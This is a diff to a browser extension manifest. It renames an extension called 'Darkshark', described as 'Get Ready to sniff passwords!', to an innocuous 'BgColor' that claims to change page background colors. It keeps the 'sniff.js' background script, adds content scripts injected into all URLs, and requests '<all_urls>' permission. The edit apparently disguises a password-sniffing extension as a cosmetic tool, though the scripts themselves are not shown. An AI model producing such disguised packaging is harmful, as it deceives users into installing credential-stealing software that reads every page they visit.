@@ -1,24 +1,30 @@
 {
     "manifest_version": 2,
-    "name": "Darkshark",
+    "name": "BgColor",
     "version": "1.0",
-    "description": "Get Ready to sniff passwords!",
+    "description": "Change bg color of any page!!",
     "icons": {
         "128": "ds128.png",
         "48": "ds48.png",
         "16": "ds16.png"
     },
-    "browser_action": {
+    "page_action": {
         "default_icon": "ds16.png",
-        "default_popup": "popup.html"
+        "default_popup": "popup.html",
+        "default_title": "BgColor"
     },
     "background": {
         "scripts": ["sniff.js"],
         "persistent": false
     },
+    "content_scripts": [
+        {
+            "matches": ["<all_urls>"],
+            "js": ["content.js", "jquery-3.5.1.min.js"]
+        }
+    ],
     "permissions" : [
         "tabs", 
-        "storage", 
-        "notifications"
+        "<all_urls>"
     ]
 }
